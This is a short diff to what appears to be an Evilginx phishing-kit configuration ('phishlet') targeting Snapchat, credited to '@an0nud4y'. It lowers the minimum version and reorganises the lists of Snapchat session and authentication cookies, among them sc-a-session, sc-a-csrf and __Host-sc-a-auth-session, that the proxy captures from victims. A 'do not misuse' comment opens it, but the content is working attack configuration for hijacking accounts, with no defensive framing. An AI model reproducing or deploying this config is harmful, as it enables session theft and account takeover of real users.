@@ -2,7 +2,7 @@
 # PLEASE DO NOT MISUSE THIS PHISHLET.
 
 author: '@an0nud4y'
-min_ver: '3.2.0'
+min_ver: '3.0.0'
 redirect_url: 'https://accounts.snapchat.com/v2/download-my-data'
 
 
@@ -46,11 +46,9 @@ proxy_hosts:
 
 auth_tokens:
   - domain: '.snapchat.com'
-    keys: ['sc-a-nonce', web_client_id', 'sc-cookies-accepted', 'sc-a-csrf', 'sc-a-session', 'xsrf_token', '_sc-sid', 'sc-wcid', '_scid', '_scid_r', '__Host-sc-authn-session-payload', '__Host-X-Snap-Client-Cookie', '__Host-sc-a-nonce', '__Host-sc-a-auth-session', '.*,regexp']
-    type: 'cookie'
+    keys: ['sc-a-nonce', '.*,regexp']      
   - domain: 'accounts.snapchat.com'
-    keys: ['xsrf_token', '_sc-sid', 'sc-wcid', '.*,regexp']
-    type: 'cookie'
+    keys: ['web_client_id', 'sc-cookies-accepted', 'sc-a-csrf', 'sc-a-session', 'xsrf_token', '.*,regexp'] 
    
 
 
